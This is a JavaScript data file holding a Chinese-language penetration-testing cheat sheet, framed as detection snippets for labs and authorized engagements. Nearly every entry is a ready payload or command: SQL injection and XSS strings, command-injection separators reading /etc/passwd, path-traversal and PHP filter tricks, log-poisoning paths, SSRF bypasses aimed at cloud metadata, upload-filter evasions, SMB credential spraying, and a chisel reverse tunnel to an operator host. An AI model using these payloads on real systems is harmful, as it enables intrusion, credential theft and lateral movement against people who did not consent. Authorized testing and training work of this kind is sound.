// 实战速查（手工维护）
// 定位：靶场与授权测试现场的「检测/验证」片段，不包含武器化利用代码。
// 每条：cat 分类 / title 名称 / code 片段 / note 说明
window.CHEATS = [
  // ---------- 注入探测 ----------
  {
    cat: '注入',
    title: '单引号触发语法错误',
    code: "'",
    note: '看响应是否 500、报错回显或页面结构突变。这是最便宜的注入探测，先做它。',
  },
  {
    cat: '注入',
    title: '布尔差异（字符型）',
    code: "' AND '1'='1   /   ' AND '1'='2",
    note: '两次响应长度或内容不同 → 存在布尔盲注。用响应长度对比，不靠肉眼。',
  },
  {
    cat: '注入',
    title: '布尔差异（数字型）',
    code: '1 AND 1=1   /   1 AND 1=2',
    note: '数字型不需要引号闭合，直接跟表达式。',
  },
  {
    cat: '注入',
    title: '时间盲注',
    code: "1' AND SLEEP(5)-- -",
    note: '无回显、无差异时用。至少采样 3 次，阈值放到 4 秒以上，避免网络抖动误判。',
  },
  {
    cat: '注入',
    title: '列数探测',
    code: 'ORDER BY 3-- -',
    note: '递增到报错为止，得到列数，再决定 union select 的位置。',
  },
  {
    cat: '注入',
    title: '报错回显版本',
    code: "AND extractvalue(1,concat(0x7e,version()))-- -",
    note: 'MySQL 5.1+ 可用。目的是证明「能执行函数」，不是脱库。',
  },

  // ---------- XSS 上下文 ----------
  {
    cat: 'XSS',
    title: '先放唯一标记找反射点',
    code: 'xss12345',
    note: '搜索响应体里这个串落在哪：标签之间、属性里、还是 <script> 里。上下文决定后面怎么闭合。',
  },
  {
    cat: 'XSS',
    title: '标签之间',
    code: '<img src=x onerror=alert(1)>',
    note: '最基础的形态。如果被过滤，换 <svg onload=alert(1)> 试试。',
  },
  {
    cat: 'XSS',
    title: '双引号属性内',
    code: '" autofocus onfocus=alert(1) x="',
    note: '闭合属性后加事件，最后补一个引号让后面的模板不报错。',
  },
  {
    cat: 'XSS',
    title: '单引号属性内',
    code: "' autofocus onfocus=alert(1) x='",
    note: '同上，注意闭合字符要和页面一致。',
  },
  {
    cat: 'XSS',
    title: 'JS 字符串内',
    code: '";alert(1);//',
    note: '闭合字符串并注释掉剩余代码。先确认是双引号还是单引号包裹。',
  },
  {
    cat: 'XSS',
    title: 'URL 上下文',
    code: 'javascript:alert(1)',
    note: 'href / src / location 赋值处。现代浏览器对 javascript: 有限制，注意实际可执行性。',
  },

  // ---------- 命令与文件 ----------
  {
    cat: '命令',
    title: '命令分隔符探测',
    code: ';id   |id   &&id   $(id)',
    note: '每个都试一遍，不同过滤规则漏的符号不一样。用 id 而不是 whoami，信息更多。',
  },
  {
    cat: '命令',
    title: '空格被过滤',
    code: 'cat${IFS}/etc/passwd',
    note: '${IFS} 替代空格。其他等价写法：$IFS$9、%09、<>。',
  },
  {
    cat: '命令',
    title: '路径穿越基础',
    code: '../../../../etc/passwd',
    note: '层级不够就继续加。Windows 目标改用 ..\\..\\windows\\win.ini。',
  },
  {
    cat: '命令',
    title: '穿越被过滤',
    code: '....//....//etc/passwd',
    note: '过滤是"删掉 ../"时，删完正好拼回 ../。编码变体：%2e%2e%2f、..%252f。',
  },
  {
    cat: '命令',
    title: 'PHP 封装器读源码',
    code: 'php://filter/convert.base64-encode/resource=index.php',
    note: '拿到 base64 再解开。源码里的数据库密码、密钥往往比漏洞本身更值钱。',
  },
  {
    cat: '命令',
    title: '日志包含路径',
    code: '../../../../var/log/nginx/access.log',
    note: '先把代码写进 UA 或请求路径，再包含日志。前提是 Web 进程能读日志。',
  },

  // ---------- SSRF ----------
  {
    cat: 'SSRF',
    title: '回环地址变形',
    code: 'http://127.1/    http://2130706433/    http://0x7f.0.0.1/',
    note: '黑名单只写 127.0.0.1 时的常规绕过。还有 [::1]、[::ffff:127.0.0.1]。',
  },
  {
    cat: 'SSRF',
    title: '云元数据地址',
    code: 'http://169.254.169.254/latest/meta-data/',
    note: '云主机上先看这个。只读不导出，拿到凭据立即停手并写报告。',
  },
  {
    cat: 'SSRF',
    title: '内网端口探测清单',
    code: '6379 3306 9200 2375 8080 6379 11211 27017',
    note: 'Redis、MySQL、ES、Docker API、Memcached、Mongo。按业务场景挑，别盲扫。',
  },
  {
    cat: 'SSRF',
    title: '字典协议探 banner',
    code: 'dict://127.0.0.1:6379/info',
    note: '能拿到服务响应就说明端口通，且协议可控。',
  },

  // ---------- 上传 ----------
  {
    cat: '上传',
    title: '可执行后缀清单',
    code: 'php3 php4 php5 php7 phtml pht phar  jsp jspx  asp asa cer cdx',
    note: '黑名单永远列不全。测试时按目标中间件挑，别一股脑全发（会触发告警）。',
  },
  {
    cat: '上传',
    title: '双后缀与大小写',
    code: 'shell.php.jpg    shell.PhP    shell.php.',
    note: '针对 Apache 多后缀解析、Windows 大小写不敏感、尾部点被吞。',
  },
  {
    cat: '上传',
    title: 'MIME 头改图片',
    code: 'Content-Type: image/png',
    note: '只校验 Content-Type 的上传点，改这一行即可过。前端校验一律抓包绕过。',
  },

  // ---------- 侦察与隧道 ----------
  {
    cat: '侦察',
    title: '全端口粗扫',
    code: 'nmap -p- --min-rate 2000 -T4 -Pn -oG scan.txt <ip>',
    note: '第一轮只要"哪些端口开着"。生产环境先确认授权允许这个强度。',
  },
  {
    cat: '侦察',
    title: '目录爆破（按大小过滤）',
    code: 'ffuf -w ~/wordlists/common.txt -u https://target/FUZZ -mc 200,301,403 -fs 0',
    note: '自定义 404 会让所有路径都返回 200，-fs 按响应长度过滤比按状态码可靠。',
  },
  {
    cat: '侦察',
    title: '虚拟主机发现',
    code: 'ffuf -w vhosts.txt -u http://<ip> -H "Host: FUZZ.example.com" -fs 4242',
    note: '一台 IP 可能跑几十个站。先访问 IP 记下默认响应长度，再看哪些 Host 不一样。',
  },
  {
    cat: '侦察',
    title: 'SMB 批量验证凭据',
    code: 'nxc smb 10.10.20.0/24 -u user -p pass --continue-on-success',
    note: '注意账号锁定策略。横向前先小范围验证，别整段硬扫。',
  },
  {
    cat: '隧道',
    title: 'chisel 反向 socks',
    code: 'chisel client http://<your-ip>:8080 R:socks',
    note: '只有 Web 出网时最省事。之后用 proxychains4 挂上 1080。',
  },
  {
    cat: '隧道',
    title: '代理下扫描要用 -sT',
    code: 'proxychains4 nmap -sT -Pn -p 80,445,3389 10.10.20.0/24',
    note: 'SYN 扫描和 UDP 走不了代理，会静默失败。慢是正常的。',
  },
];
